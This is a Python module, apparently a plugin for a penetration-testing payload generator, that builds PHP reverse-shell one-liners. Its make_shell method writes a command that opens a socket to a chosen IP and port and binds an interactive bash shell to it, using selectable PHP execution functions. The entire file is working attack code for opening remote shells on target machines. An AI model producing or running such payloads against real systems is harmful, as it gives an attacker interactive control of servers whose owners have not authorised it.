from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--exec",
            default="system",
            choices=[
                "exec",
                "shell_exec",
                "system",
                "passthru",
                "popen",
                "back_quote",
                "proc_open"
            ]
        )
        self.opts.description = "[ReverseShell][TCP] PHP from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
        self.shell_type = "tcp"

    def make_shell(self):
        self.shell = f"""php -r '$sock=fsockopen("{self.args.ip}",{self.args.port});"""
        if self.args.exec == "back_quote":
            self.shell += f"""`{self.args.shell} -i <&3 >&3 2>&3`;'"""
        elif self.args.exec == "proc_open":
            self.shell += f"""$proc=proc_open("{self.args.shell} -i","""
            self.shell += "array(0=>$sock, 1=>$sock,2=>$sock),$pipes);'"
        else:
            self.shell += f"""{self.args.exec}("{self.args.shell} -i <&3 >&3 2>&3");'"""
